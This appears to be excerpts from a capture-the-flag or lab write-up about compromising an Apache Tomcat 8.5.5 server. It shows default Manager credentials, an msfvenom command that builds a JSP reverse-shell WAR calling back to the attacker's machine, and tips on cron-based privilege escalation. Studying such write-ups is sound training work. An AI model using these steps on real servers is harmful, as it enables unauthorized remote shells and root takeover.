...
Browsing to the default Tomcat page at `http://<TARGET_IP>:8080` confirmed version 8.5.5 and showed buttons for **Manager App**, **Server Status**, and **Host Manager**. The default page also noted:

```
Users are defined in: $CATALINA_HOME/conf/tomcat-users.xml
```

Accessing the Manager App required authentication:

```
http://<TARGET_IP>:8080/manager/html
```

The HTTP 401 error page — shown when login is cancelled — contained an example snippet for adding users to `tomcat-users.xml`, with a role and credential embedded directly in the error message:

```xml
<user username="tomcat" password="s3cret" roles="manager-gui,admin-gui"/>
```

> **Why this matters:** This is a known Tomcat misconfiguration. The error page is generated by Tomcat itself and, depending on the version and configuration, can include sample credentials that operators copy verbatim into production configs. The credentials were valid.
...
Tomcat executes Java web applications packaged as WAR (Web Application Archive) files — the Java equivalent of uploading a PHP shell to a PHP server. PHP payloads are incompatible; a Java-based payload is required.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI_IP> LPORT=8000 -f war -o exploit.war
```

`jsp_shell_reverse_tcp` was chosen because WAR files are expanded as JSP applications, making it the most directly compatible payload format.
...
> **Why `/exploit` alone doesn't work:** Browsing to `http://<TARGET_IP>:8080/exploit` reaches the application root, but the payload is in the named JSP file. Without specifying the filename, the server returns a 404 or index — the shell is never triggered.
...
- `test.txt` was owned by root and had a very recent modification timestamp, implying it was being written to automatically
...
`nano` was unavailable due to the incomplete PTY in the current shell:
...
> **Why nano fails here:** `nano` requires a functional terminal environment (`$TERM` and PTY). Shells obtained via JSP reverse payloads don't have a full terminal — even after `pty.spawn`, environment variables like `TERM` may be unset. `echo` writes directly to the file without needing a terminal.
...
- 📁 **Recent timestamps on root-owned files signal cron activity:** `test.txt` had a fresh modification time and was owned by root — a clear indicator of scheduled execution without needing to read `crontab` first. Observing file metadata before reading configs is a fast way to spot cron abuse.

- ⏺️ **`echo` is the fallback when editors fail in limited shells:** `nano` and `vi` require a proper terminal. In JSP or other minimal shells where `$TERM` is unset, `echo 'cmd' > file` is the reliable alternative for short overwrites.
